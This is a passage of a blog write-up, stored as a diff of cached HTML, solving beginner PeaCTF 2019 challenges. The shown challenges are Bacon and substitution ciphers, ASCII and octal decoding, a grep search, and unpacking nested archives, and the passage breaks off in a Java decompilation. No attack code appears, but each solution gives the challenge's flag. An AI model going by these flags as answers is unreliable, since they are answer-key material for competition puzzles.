@@ -1,0 +1,953 @@
+I"�G<p>PeaCTF was a CTF created for high school students, so it’s a little bit on the easier side. I ended at 13th place, finishing all challenges.</p>
+
+<div class="toc-container">
+  <ul id="markdown-toc">
+    <li><a href="#breakfast" id="markdown-toc-h1-header">Breakfast</a>
+    <ul>
+        <li><a href="#challenge" id="markdown-toc-h3-header">Challenge</a></li>
+  	  	<li><a href="#solution" id="markdown-toc-h3-header">Solution</a></li>
+    </ul>
+    </li>
+    <li><a href="#broken-keyboard" id="markdown-toc-h1-header">Broken Keyboard</a>
+    <ul>
+        <li><a href="#challenge-1" id="markdown-toc-h3-header">Challenge</a></li>
+  	  	<li><a href="#solution-1" id="markdown-toc-h3-header">Solution</a></li>
+    </ul>
+    </li>
+    <li><a href="#worth" id="markdown-toc-h1-header">Worth</a>
+    <ul>
+        <li><a href="#challenge-2" id="markdown-toc-h3-header">Challenge</a></li>
+  	  	<li><a href="#solution-2" id="markdown-toc-h3-header">Solution</a></li>
+    </ul>
+    </li>
+    <li><a href="#hide-and-seek" id="markdown-toc-h1-header">Hide and Seek</a>
+    <ul>
+        <li><a href="#challenge-3" id="markdown-toc-h3-header">Challenge</a></li>
+  	  	<li><a href="#solution-3" id="markdown-toc-h3-header">Solution</a></li>
+    </ul>
+    </li>
+    <li><a href="#school" id="markdown-toc-h1-header">School</a>
+    <ul>
+        <li><a href="#challenge-4" id="markdown-toc-h3-header">Challenge</a></li>
+  	  	<li><a href="#solution-4" id="markdown-toc-h3-header">Solution</a></li>
+    </ul>
+    </li>
+    <li><a href="#choose-your-pokemon" id="markdown-toc-h1-header">Choose your Pokemon</a>
+    <ul>
+        <li><a href="#challenge-5" id="markdown-toc-h3-header">Challenge</a></li>
+  	  	<li><a href="#solution-5" id="markdown-toc-h3-header">Solution</a></li>
+    </ul>
+    </li>
+    <li><a href="#coffee-time" id="markdown-toc-h1-header">Coffee Time</a>
+    <ul>
+        <li><a href="#challenge-6" id="markdown-toc-h3-header">Challenge</a></li>
+  	  	<li><a href="#solution-6" id="markdown-toc-h3-header">Solution</a></li>
+    </ul>
+    </li>
+    <li><a href="#we-are-extr" id="markdown-toc-h1-header">We are E.xtr</a>
+    <ul>
+        <li><a href="#challenge-7" id="markdown-toc-h3-header">Challenge</a></li>
+  	  	<li><a href="#solution-7" id="markdown-toc-h3-header">Solution</a></li>
+    </ul>
+    </li>
+    <li><a href="#crack-the-key" id="markdown-toc-h1-header">Crack the Key</a>
+    <ul>
+        <li><a href="#challenge-8" id="markdown-toc-h3-header">Challenge</a></li>
+  	  	<li><a href="#solution-8" id="markdown-toc-h3-header">Solution</a></li>
+    </ul>
+    </li>
+    <li><a href="#rsa" id="markdown-toc-h1-header">RSA</a>
+    <ul>
+        <li><a href="#challenge-9" id="markdown-toc-h3-header">Challenge</a></li>
+  	  	<li><a href="#solution-9" id="markdown-toc-h3-header">Solution</a></li>
+    </ul>
+    </li>
+    <li><a href="#educated-guess" id="markdown-toc-h1-header">Educated Guess</a>
+    <ul>
+        <li><a href="#challenge-10" id="markdown-toc-h3-header">Challenge</a></li>
+  	  	<li><a href="#solution-10" id="markdown-toc-h3-header">Solution</a></li>
+    </ul>
+    </li>
+    <li><a href="#the-wonderful-wizard" id="markdown-toc-h1-header">The Wonderful Wizard</a>
+    <ul>
+        <li><a href="#challenge-11" id="markdown-toc-h3-header">Challenge</a></li>
+  	  	<li><a href="#solution-11" id="markdown-toc-h3-header">Solution</a></li>
+    </ul>
+    </li>
+    <li><a href="#song-of-my-people" id="markdown-toc-h1-header">Song of My People</a>
+    <ul>
+        <li><a href="#challenge-12" id="markdown-toc-h3-header">Challenge</a></li>
+  	  	<li><a href="#solution-12" id="markdown-toc-h3-header">Solution</a></li>
+    </ul>
+    </li>
+    <li><a href="#philips-and-over" id="markdown-toc-h1-header">Philips And Over</a>
+    <ul>
+        <li><a href="#challenge-13" id="markdown-toc-h3-header">Challenge</a></li>
+  	  	<li><a href="#solution-13" id="markdown-toc-h3-header">Solution</a></li>
+    </ul>
+    </li>
+  </ul>
+</div>
+
+<p>PeaCTF ran from the 22nd of July until the 28th of July. The following are my writeups for all the challenges. I participated solo and managed to achieve 13th place out of about 500 teams.</p>
+
+<p>A quick note before we begin: If you intend on following each writeup, make sure you do the challenges yourself. Different accounts get different “instances” of the challenges and will therefore have different flags.</p>
+
+<h1 id="breakfast">Breakfast</h1>
+
+<ul>
+  <li><strong>Category:</strong> Cryptography</li>
+  <li><strong>Points:</strong> 50</li>
+</ul>
+
+<h3 id="challenge">Challenge</h3>
+
+<blockquote>
+  <p>Mmm I ate some nice <strong>bacon</strong> and eggs this morning. Find out what else I had for
+an easy flag. Don’t forget to capitalize CTF! <a href="https://shell1.2019.peactf.com/static/fa2ff378dd2e1361fcf19cdf92e5d6f0/enc.txt">Ciphertext</a></p>
+</blockquote>
+
+<h3 id="solution">Solution</h3>
+
+<p>We get a file ‘enc.txt’. Let’s see what it says.</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">»</span> <span class="n">cat</span> <span class="n">enc</span><span class="p">.</span><span class="n">txt</span>
+<span class="mo">011100010000000000101001000101</span><span class="p">{</span><span class="mo">00100001100011010100000000010100101010100010010001</span><span class="p">}</span>
+</code></pre></div></div>
+
+<p>I first notice that the length of the binary string on the left side of the ‘{‘ is 30 bytes. Since that’s not divisible by four, I know it won’t just be a simple binary to ascii conversion (and testing that out proves that hypothesis).</p>
+
+<p>The challenge description has ‘bacon’ in bold, so my first thought was to try <a href="https://en.wikipedia.org/wiki/Bacon%27s_cipher">Bacon’s Cipher</a>. I didn’t bother writing a script for this, I just split the binary string into groups of 5 bytes, then used the table in the wikipedia page linked above to get the flag.</p>
+
+<p>Flag: <code class="highlighter-rouge">peaCTF{eggwaffles}</code></p>
+
+<h1 id="broken-keyboard">Broken Keyboard</h1>
+
+<ul>
+  <li><strong>Category:</strong> Cryptography</li>
+  <li><strong>Points:</strong> 50</li>
+</ul>
+
+<h3 id="challenge-1">Challenge</h3>
+
+<blockquote>
+  <p>Help! My keyboard only types numbers! <a href="https://shell1.2019.peactf.com/static/a993b6d91714b32556129ca0167b97ed/enc.txt">Ciphertext</a></p>
+</blockquote>
+
+<h3 id="solution-1">Solution</h3>
+
+<p>We get a file ‘enc.txt’. Let’s see what it says.</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">»</span> <span class="n">cat</span> <span class="n">enc</span><span class="p">.</span><span class="n">txt</span>
+<span class="mi">112</span> <span class="mi">101</span> <span class="mi">97</span> <span class="mi">67</span> <span class="mi">84</span> <span class="mi">70</span> <span class="mi">123</span> <span class="mi">52</span> <span class="mi">115</span> <span class="mi">99</span> <span class="mi">49</span> <span class="mi">49</span> <span class="mi">105</span> <span class="mi">115</span> <span class="mi">99</span> <span class="mi">48</span> <span class="mi">48</span> <span class="mi">108</span> <span class="mi">125</span>
+</code></pre></div></div>
+
+<p>Looks just like ascii values.</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">»</span> <span class="n">python</span>
+<span class="n">Python</span> <span class="mi">2</span><span class="p">.</span><span class="mi">7</span><span class="p">.</span><span class="mi">16</span> <span class="p">(</span><span class="k">default</span><span class="p">,</span> <span class="n">Apr</span>  <span class="mi">6</span> <span class="mi">2019</span><span class="p">,</span> <span class="mo">01</span><span class="o">:</span><span class="mi">42</span><span class="o">:</span><span class="mi">57</span><span class="p">)</span>
+<span class="p">[</span><span class="n">GCC</span> <span class="mi">8</span><span class="p">.</span><span class="mi">3</span><span class="p">.</span><span class="mi">0</span><span class="p">]</span> <span class="n">on</span> <span class="n">linux2</span>
+<span class="n">Type</span> <span class="s">"help"</span><span class="p">,</span> <span class="s">"copyright"</span><span class="p">,</span> <span class="s">"credits"</span> <span class="n">or</span> <span class="s">"license"</span> <span class="k">for</span> <span class="n">more</span> <span class="n">information</span><span class="p">.</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">a</span> <span class="o">=</span> <span class="s">"112 101 97 67 84 70 123 52 115 99 49 49 105 115 99 48 48 108 125"</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">a</span> <span class="o">=</span> <span class="n">a</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">" "</span><span class="p">)</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">flag</span> <span class="o">=</span> <span class="s">""</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="k">for</span> <span class="n">c</span> <span class="n">in</span> <span class="n">a</span><span class="o">:</span>
+<span class="p">...</span>     <span class="n">flag</span> <span class="o">+=</span> <span class="n">chr</span><span class="p">(</span><span class="kt">int</span><span class="p">(</span><span class="n">c</span><span class="p">))</span>
+<span class="p">...</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">flag</span>
+<span class="err">'</span><span class="n">peaCTF</span><span class="p">{</span><span class="mi">4</span><span class="n">sc11isc00l</span><span class="p">}</span><span class="err">'</span>
+<span class="o">&gt;&gt;&gt;</span>
+</code></pre></div></div>
+
+<p>Flag: <code class="highlighter-rouge">peaCTF{4sc11isc00l}</code></p>
+
+<h1 id="worth">Worth</h1>
+
+<ul>
+  <li><strong>Category:</strong> General Skills</li>
+  <li><strong>Points:</strong> 50</li>
+</ul>
+
+<h3 id="challenge-2">Challenge</h3>
+
+<blockquote>
+  <p>This problem is worth 0o670 points.</p>
+
+  <p>Hints: Put your answer in the flag format: flag{peactf_}</p>
+</blockquote>
+
+<h3 id="solution-2">Solution</h3>
+
+<p>0o670 is octal 670. We change it to decimal.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>» python
+Python 2.7.16 <span class="o">(</span>default, Apr  6 2019, 01:42:57<span class="o">)</span>
+<span class="o">[</span>GCC 8.3.0] on linux2
+Type <span class="s2">"help"</span>, <span class="s2">"copyright"</span>, <span class="s2">"credits"</span> or <span class="s2">"license"</span> <span class="k">for </span>more information.
+<span class="o">&gt;&gt;&gt;</span> int<span class="o">(</span><span class="s2">"670"</span>, 8<span class="o">)</span>
+440
+<span class="o">&gt;&gt;&gt;</span>
+</code></pre></div></div>
+
+<p>Flag: <code class="highlighter-rouge">flag{peactf_440}</code></p>
+
+<h1 id="hide-and-seek">Hide and Seek</h1>
+
+<ul>
+  <li><strong>Category:</strong> General Skills</li>
+  <li><strong>Points:</strong> 100</li>
+</ul>
+
+<h3 id="challenge-3">Challenge</h3>
+<blockquote>
+  <p>Try to find to the flag file located somewhere in the folders located in: /problems/hide-and-seek_25_0e640bba38cc92e6d15b31356b8da948</p>
+
+  <p>Hints: Some tools get handy when files get disorganized. What does the command “find” do?</p>
+</blockquote>
+
+<h3 id="solution-3">Solution</h3>
+
+<p>This challenge is meant to be done on the shell server that they provide. The output below is very confusing to read, but basically, there’s a bunch of folders in the problem directory with md5 hashes as their names. I just ran <code class="highlighter-rouge">grep -r "flag"</code> to do a recursive search in all files for the string “flag” and found the flag.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">faithlesss</span><span class="err">@</span><span class="n">peactf</span><span class="o">-</span><span class="mi">2019</span><span class="o">-</span><span class="n">shell</span><span class="o">-</span><span class="mi">1</span><span class="o">:~</span><span class="err">$</span> <span class="n">cd</span> <span class="o">/</span><span class="n">problems</span><span class="o">/</span><span class="n">hide</span><span class="o">-</span><span class="n">and</span><span class="o">-</span><span class="n">seek_25_0e640bba38cc92e6d15b31356b8da948</span>
+<span class="n">faithlesss</span><span class="err">@</span><span class="n">peactf</span><span class="o">-</span><span class="mi">2019</span><span class="o">-</span><span class="n">shell</span><span class="o">-</span><span class="mi">1</span><span class="o">:/</span><span class="n">problems</span><span class="o">/</span><span class="n">hide</span><span class="o">-</span><span class="n">and</span><span class="o">-</span><span class="n">seek_25_0e640bba38cc92e6d15b31356b8da948</span><span class="err">$</span> <span class="n">ls</span>
+<span class="mi">0</span><span class="n">d25b16b914709741369b819945b0bf0</span>  <span class="mi">729</span><span class="n">f8ea0d5411ba9ace8ab81b85dfeeb</span>  <span class="n">c7aedbdcaf676f8d2c09442e52cfafaa</span>
+<span class="mi">1669</span><span class="n">f36b1ac7090bd856260ce43218a5</span>  <span class="mi">78</span><span class="n">d34b9d02d92171a474ec1da4bcb00e</span>  <span class="n">c7ea4c7f95347f4df35db14baf36a7b3</span>
+<span class="mi">1</span><span class="n">d605b2d651f64d92b08806e81ed628e</span>  <span class="mi">80</span><span class="n">c61a18ebf26a9879459c019d3f7c53</span>  <span class="n">ce1dd5c46ece18fe24e7831bcc3ec30c</span>
+<span class="mf">214e77</span><span class="n">f3ad89cf3b51a6a1e57dbdf71d</span>  <span class="mi">842396</span><span class="n">f0947cb3045687b38d2146ac0b</span>  <span class="n">d0cbef8bb144f0a6d4f16b40b412335a</span>
+<span class="mf">268e3</span><span class="n">d17d577477026a55082f273a527</span>  <span class="mi">8905</span><span class="n">c0803e929825858959e836851aa3</span>  <span class="n">d52829411065f6931fa4607ba9eb4227</span>
+<span class="mi">292</span><span class="n">d47481cc793624f415b3fc9f52e4c</span>  <span class="mi">8</span><span class="n">d10a1205abdfd74664b79c4d326eb13</span>  <span class="n">d5a2c0077680ed77f9af29a18d0da759</span>
+<span class="mi">2</span><span class="n">a59a8dd4f83938fbe9111aab59843ee</span>  <span class="mi">8</span><span class="n">d5b3cc0a20b8be88b717f6c83a7b965</span>  <span class="n">d6b47a0cd038e4fdb8d656f674100a87</span>
+<span class="mf">3e6</span><span class="n">ed491b34f304154bed7d7171636df</span>  <span class="mf">956e5</span><span class="n">db22d81f3af003639deeb59d15d</span>  <span class="n">dbf9e3bc723987bd4acab05c7b280466</span>
+<span class="mi">4</span><span class="n">bce56b4a176bf50f04b7a80d30217df</span>  <span class="mi">9</span><span class="n">ce326bc264c115a1508342c5f9a52b7</span>  <span class="n">e1a5401230004091da71f0117fb2dc72</span>
+<span class="mi">50</span><span class="n">d8794afb17c96491bbe9e18b2a57d9</span>  <span class="n">a4f7099a716fdd218ba2ff758ff0f2d6</span>  <span class="n">e4c6d0ac2b3625b06deb9da1d62b79f8</span>
+<span class="mi">53636240136</span><span class="n">d7dab43189177b32a2eb5</span>  <span class="n">a755b25ac7374bd637cf50674c96eda9</span>  <span class="n">ea36acd172c9113dd6af4ec079c225da</span>
+<span class="mi">536</span><span class="n">f25f87904314d67cd7d8609367aad</span>  <span class="n">a94c683eaa581ca96f3fc9aa3bd71745</span>  <span class="n">ef16c11436d3172eb20af75eeaf73e3c</span>
+<span class="mi">581</span><span class="n">d1a983deb7c64f295c5b9c0208dd5</span>  <span class="n">b92024daf712d6c59a8be81086cd3762</span>  <span class="n">f0ca4adbc0fec022f72bae2e7be2643d</span>
+<span class="mi">5</span><span class="n">b7a6b80095d0a33bcd76df8ec9b8b83</span>  <span class="n">bc901a79cc34dbbc04908905a6e7a04a</span>  <span class="n">f2067e099c9081dda0adfc2ec079b6ed</span>
+<span class="mi">669</span><span class="n">ad7956d87d857b16f870e9a2cac88</span>  <span class="n">bf5f5250b2ff1ad512d71d776761ce36</span>  <span class="n">f2985a210aecc06ae0992292d7030669</span>
+<span class="mi">6</span><span class="n">d8283aae25d1f48cd08a0e71c9e6fb7</span>  <span class="n">c276bddb69f0e6546ae2ff489cdfbaf9</span>  <span class="n">fbec866af69d37e4b0eed978347ec10f</span>
+<span class="mi">7153</span><span class="n">a0a051f591b7cd54cac433c4ca2c</span>  <span class="n">c525832a0b2cf142569e9206e907c2e2</span>
+
+<span class="n">faithlesss</span><span class="err">@</span><span class="n">peactf</span><span class="o">-</span><span class="mi">2019</span><span class="o">-</span><span class="n">shell</span><span class="o">-</span><span class="mi">1</span><span class="o">:/</span><span class="n">problems</span><span class="o">/</span><span class="n">hide</span><span class="o">-</span><span class="n">and</span><span class="o">-</span><span class="n">seek_25_0e640bba38cc92e6d15b31356b8da948</span><span class="err">$</span> <span class="n">grep</span> <span class="o">-</span><span class="n">r</span> <span class="s">"peaCTF"</span>
+<span class="n">faithlesss</span><span class="err">@</span><span class="n">peactf</span><span class="o">-</span><span class="mi">2019</span><span class="o">-</span><span class="n">shell</span><span class="o">-</span><span class="mi">1</span><span class="o">:/</span><span class="n">problems</span><span class="o">/</span><span class="n">hide</span><span class="o">-</span><span class="n">and</span><span class="o">-</span><span class="n">seek_25_0e640bba38cc92e6d15b31356b8da948</span><span class="err">$</span> <span class="n">grep</span> <span class="o">-</span><span class="n">r</span> <span class="s">"flag"</span>
+<span class="mi">6</span><span class="n">d8283aae25d1f48cd08a0e71c9e6fb7</span><span class="o">/</span><span class="mi">62</span><span class="n">c213fe3df128148aab4613a639f423</span><span class="o">/</span><span class="n">e090b6868d74a6255d763d6660d8117e</span><span class="o">/</span><span class="mi">435</span><span class="n">d968d9d03</span>
+<span class="n">d21df3a2cf50f1bae280</span><span class="o">/</span><span class="n">e28de84641381790a1aad0ea7b532da1</span><span class="o">/</span><span class="mi">5</span><span class="n">aff2f46968759edf769a6c2dbd0ce6f</span><span class="o">/</span><span class="n">c8572610a56e9afece38b304</span>
+<span class="mi">610649</span><span class="n">ed</span><span class="o">/</span><span class="mi">73</span><span class="n">c633c0ef2b0e2b3dad75752c8ae5a1</span><span class="o">/</span><span class="n">eead523c9655f13983275e77eaee48ae</span><span class="o">/</span><span class="mi">1</span><span class="n">a05ff8f68e5c5da8339224209d1ae2e</span><span class="o">/</span><span class="n">d7c</span>
+<span class="mi">4</span><span class="n">cb734c81223435648f1281e6deec</span><span class="o">/</span><span class="mi">57</span><span class="n">ddca46fa4b3261bcc698ffa118e86d</span><span class="o">/</span><span class="n">af839d876aea0f0e5876b2bbea370f41</span><span class="o">/</span><span class="mi">3</span><span class="n">f6be00884efeec</span>
+<span class="mi">5</span><span class="n">d9b7c1b0f49fa533</span><span class="o">/</span><span class="n">c4a88c081884012f1ab6b9a41fbee8ad</span><span class="o">/</span><span class="n">bfe0dc1a7d0280af6192d7dd5d423bf7</span><span class="o">/</span><span class="mi">7</span><span class="n">decc2b55d454de7d822f5840a5</span>
+<span class="n">b19b7</span><span class="o">/</span><span class="n">ac85917d5adae905367a3b2f82e2d148</span><span class="o">/</span><span class="n">e8a193af8b23e08e506cc0a93a067265</span><span class="o">/</span><span class="mi">5</span><span class="n">ef7122e5df6d550cbc00b5ac54d0de0</span><span class="o">/</span><span class="n">flag</span><span class="p">.</span><span class="n">t</span>
+<span class="n">xt</span><span class="o">:</span><span class="n">flag</span><span class="p">{</span><span class="n">peactf_linux_is_fun_bb6f529aa108b7d7021c00833742fe7a</span><span class="p">}</span>
+<span class="n">faithlesss</span><span class="err">@</span><span class="n">peactf</span><span class="o">-</span><span class="mi">2019</span><span class="o">-</span><span class="n">shell</span><span class="o">-</span><span class="mi">1</span><span class="o">:/</span><span class="n">problems</span><span class="o">/</span><span class="n">hide</span><span class="o">-</span><span class="n">and</span><span class="o">-</span><span class="n">seek_25_0e640bba38cc92e6d15b31356b8da948</span><span class="err">$</span>
+</code></pre></div></div>
+
+<p>Flag: <code class="highlighter-rouge">flag{peactf_linux_is_fun_bb6f529aa108b7d7021c00833742fe7a}</code></p>
+
+<h1 id="school">School</h1>
+
+<ul>
+  <li><strong>Category:</strong> Cryptography</li>
+  <li><strong>Points:</strong> 100</li>
+</ul>
+
+<h3 id="challenge-4">Challenge</h3>
+
+<blockquote>
+  <p>My regular teacher was out sick so we had a <strong>substitute</strong> today. <a href="https://shell1.2019.peactf.com/static/6999a90c2dc921d2e0de4720df921549/enc.txt">Ciphertext</a></p>
+</blockquote>
+
+<h3 id="solution-4">Solution</h3>
+
+<p>Looking at the enc.txt file given.</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">»</span> <span class="n">cat</span> <span class="n">enc</span><span class="p">.</span><span class="n">txt</span>
+<span class="n">Alphabet</span><span class="o">:</span> <span class="err">​</span><span class="n">WCGPSUHRAQYKFDLZOJNXMVEBTI</span>
+<span class="n">zswGXU</span><span class="p">{</span><span class="n">ljwdhsqmags</span><span class="p">}</span>
+</code></pre></div></div>
+<p>Challenge description has “substitute” in bold and the enc.txt file gives us an alphabet. Looks like a simple substitution cipher. I wrote a script for it.</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">alphabet</span> <span class="o">=</span> <span class="s">"WCGPSUHRAQYKFDLZOJNXMVEBTI"</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span>
+<span class="n">cipher</span> <span class="o">=</span> <span class="s">"zswGXU{ljwdhsqmags}"</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span>
+<span class="n">plaintext</span> <span class="o">=</span> <span class="s">""</span>
+
+<span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">cipher</span><span class="p">:</span>
+    <span class="k">if</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">alphabet</span><span class="p">:</span>
+        <span class="n">plaintext</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">alphabet</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="o">+</span> <span class="nb">ord</span><span class="p">(</span><span class="s">'a'</span><span class="p">))</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">plaintext</span> <span class="o">+=</span> <span class="n">c</span>
+
+<span class="k">print</span> <span class="n">plaintext</span> <span class="c1"># prints 'peactf{orangejuice}'
+</span></code></pre></div></div>
+
+<p>We have to make sure to capitalize the ‘ctf’ in ‘peactf’ since I called <code class="highlighter-rouge">lower()</code> on both given strings to make the script simpler.</p>
+
+<p>Flag: <code class="highlighter-rouge">peaCTF{orangejuice}</code></p>
+
+<h1 id="choose-your-pokemon">Choose your Pokemon</h1>
+
+<ul>
+  <li><strong>Category:</strong> Forensics</li>
+  <li><strong>Points:</strong> 150</li>
+</ul>
+
+<h3 id="challenge-5">Challenge</h3>
+
+<blockquote>
+  <p>Just a simple type of recursive function. <a href="https://shell1.2019.peactf.com/static/65bd33064cdedf978b43938c55bec25e/master-ball">master-ball</a></p>
+
+  <p>Hints: Flag is formatted as {plain_text}</p>
+</blockquote>
+
+<h3 id="solution-5">Solution</h3>
+
+<p>We run file against the master-ball file, see its RAR archive. Unrar it, see the next file is a zip archive. Unzip that, get a PDF file.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">»</span> <span class="n">file</span> <span class="n">master</span><span class="o">-</span><span class="n">ball</span>
+<span class="n">master</span><span class="o">-</span><span class="n">ball</span><span class="o">:</span> <span class="n">RAR</span> <span class="n">archive</span> <span class="n">data</span><span class="p">,</span> <span class="n">v5</span>
+<span class="o">-----------------------------------------------------------------------------------</span>
+<span class="err">»</span> <span class="n">unrar</span> <span class="n">x</span> <span class="n">master</span><span class="o">-</span><span class="n">ball</span>
+
+<span class="n">UNRAR</span> <span class="mi">5</span><span class="p">.</span><span class="mi">61</span> <span class="n">beta</span> <span class="mi">1</span> <span class="n">freeware</span>      <span class="n">Copyright</span> <span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="mi">1993</span><span class="o">-</span><span class="mi">2018</span> <span class="n">Alexander</span> <span class="n">Roshal</span>
+
+
+<span class="n">Extracting</span> <span class="n">from</span> <span class="n">master</span><span class="o">-</span><span class="n">ball</span>
+
+<span class="n">Extracting</span>  <span class="n">roshambo</span>                                                  <span class="n">OK</span>
+<span class="n">All</span> <span class="n">OK</span>
+<span class="o">-----------------------------------------------------------------------------------</span>
+<span class="err">»</span> <span class="n">file</span> <span class="n">roshambo</span>
+<span class="n">roshambo</span><span class="o">:</span> <span class="n">Zip</span> <span class="n">archive</span> <span class="n">data</span><span class="p">,</span> <span class="n">at</span> <span class="n">least</span> <span class="n">v2</span><span class="p">.</span><span class="mi">0</span> <span class="n">to</span> <span class="n">extract</span>
+<span class="o">-----------------------------------------------------------------------------------</span>
+<span class="err">»</span> <span class="n">unzip</span> <span class="n">roshambo</span>
+<span class="n">Archive</span><span class="o">:</span>  <span class="n">roshambo</span>
+  <span class="n">inflating</span><span class="o">:</span> <span class="n">inDesign</span>                
+<span class="o">-----------------------------------------------------------------------------------</span>
+<span class="err">»</span> <span class="n">file</span> <span class="n">inDesign</span>
+<span class="n">inDesign</span><span class="o">:</span> <span class="n">PDF</span> <span class="n">document</span><span class="p">,</span> <span class="n">version</span> <span class="mi">1</span><span class="p">.</span><span class="mi">7</span>
+</code></pre></div></div>
+
+<p>Opening the PDF file gives us a link to <a href="https://pastebin.com/AWTDEb9j">https://pastebin.com/AWTDEb9j</a>. I copied all the data from there into a file and ran file against it. I guessed that it would be rtf beforehand since the very first line starts with <code class="highlighter-rouge">{\rtf1\adeflang1025</code>.</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">»</span> <span class="n">file</span> <span class="n">flag</span><span class="p">.</span><span class="n">rtf</span>
+<span class="n">flag</span><span class="p">.</span><span class="n">rtf</span><span class="o">:</span> <span class="n">Rich</span> <span class="n">Text</span> <span class="n">Format</span> <span class="n">data</span><span class="p">,</span> <span class="n">version</span> <span class="mi">1</span><span class="p">,</span> <span class="n">unknown</span> <span class="n">character</span> <span class="n">set</span>
+</code></pre></div></div>
+
+<p>I used unrtf to convert the rtf file to normal text.</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">»</span> <span class="n">unrtf</span> <span class="o">--</span><span class="n">text</span> <span class="n">flag</span><span class="p">.</span><span class="n">rtf</span>
+<span class="cp">###  Translation from RTF performed by UnRTF, version 0.21.10
+### font table contains 101 fonts total
+### creation date: 20 July 2019 22:34
+### revision date: 20 July 2019 22:42
+### total pages: 1
+### total words: 1
+### total chars: 11
+</span>
+<span class="o">-----------------</span>
+<span class="p">{</span><span class="n">wild_type</span><span class="p">}</span>
+</code></pre></div></div>
+
+<p>Flag: <code class="highlighter-rouge">{wild_type}</code></p>
+
+<h1 id="coffee-time">Coffee Time</h1>
+
+<ul>
+  <li><strong>Category:</strong> Reversing</li>
+  <li><strong>Points:</strong> 250</li>
+</ul>
+
+<h3 id="challenge-6">Challenge</h3>
+
+<blockquote>
+  <p>Run this jar executable in a virtual machine and see what happens. <a href="https://shell1.2019.peactf.com/static/662472b783ec7377576e23f6c795dadc/coffeetime.jar">coffeetime.jar</a></p>
+</blockquote>
+
+<h3 id="solution-6">Solution</h3>
+
+<p>We get given a jar file. The challenge category is Reversing, so we know we have to decompile the file. I use jd-gui to do this.</p>
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">package</span> <span class="nn">coffeetime</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.math.BigInteger</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.util.Random</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.jline.reader.LineReader</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.jline.reader.LineReaderBuilder</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.jline.terminal.TerminalBuilder</span><span class="o">;</span>
+
+
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">CoffeeTime</span>
+<span class="o">{</span>
+  <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="nc">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">Exception</span> <span class="o">{</span> <span class="k">new</span> <span class="nc">CoffeeTime</span><span class="o">();</span> <span class="o">}</span>
+
+
+  <span class="kd">public</span> <span class="nf">CoffeeTime</span><span class="o">()</span> <span class="kd">throws</span> <span class="nc">IOException</span><span class="o">,</span> <span class="nc">InterruptedException</span> <span class="o">{</span>
+    <span class="nc">LineReader</span> <span class="n">lineReader</span> <span class="o">=</span> <span class="nc">LineReaderBuilder</span><span class="o">.</span><span class="na">builder</span><span class="o">().</span><span class="na">terminal</span><span class="o">(</span><span class="nc">TerminalBuilder</span><span class="o">.</span><span class="na">terminal</span><span class="o">()).</span><span class="na">build</span><span class="o">();</span>
+    <span class="nc">String</span> <span class="n">line</span> <span class="o">=</span> <span class="n">lineReader</span><span class="o">.</span><span class="na">readLine</span><span class="o">(</span><span class="s">"Can you give me some time to calculate a number? [y/n]\n"</span><span class="o">);</span>
+    <span class="k">if</span> <span class="o">(</span><span class="n">line</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="s">"y"</span><span class="o">))</span> <span class="o">{</span>
+      <span class="nc">Random</span> <span class="n">random</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Random</span><span class="o">();</span>
+      <span class="nc">BigInteger</span> <span class="n">bigInteger</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">BigInteger</span><span class="o">(</span><span class="mi">2000</span><span class="o">,</span> <span class="n">random</span><span class="o">);</span>
+      <span class="kt">long</span> <span class="n">timestart</span> <span class="o">=</span> <span class="nc">System</span><span class="o">.</span><span class="na">currentTimeMillis</span><span class="o">();</span>
+      <span class="nc">BigInteger</span> <span class="n">result</span> <span class="o">=</span> <span class="n">bigInteger</span><span class="o">.</span><span class="na">pow</span><span class="o">(</span><span class="mi">10000</span><span class="o">);</span>
+      <span class="kt">long</span> <span class="n">timeend</span> <span class="o">=</span> <span class="nc">System</span><span class="o">.</span><span class="na">currentTimeMillis</span><span class="o">();</span>
